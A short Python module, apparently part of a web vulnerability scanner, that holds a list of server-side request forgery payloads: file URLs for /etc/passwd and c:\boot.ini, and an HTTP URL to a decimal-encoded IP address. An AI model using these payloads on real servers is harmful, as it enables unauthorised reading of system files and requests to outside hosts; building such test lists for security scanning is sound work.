# -*- coding: utf-8 -*-
"""
"* Author     : M0nk3y"
"* Version    : 1.4"
"""

ssrf_payloads = ['''file:///etc/passwd''',
                 '''http://1966257770/ssrf_remote.html''',
                 r'''file://c:\boot.ini'''
                 ]


def get_ssrf_payloads():
    return ssrf_payloads
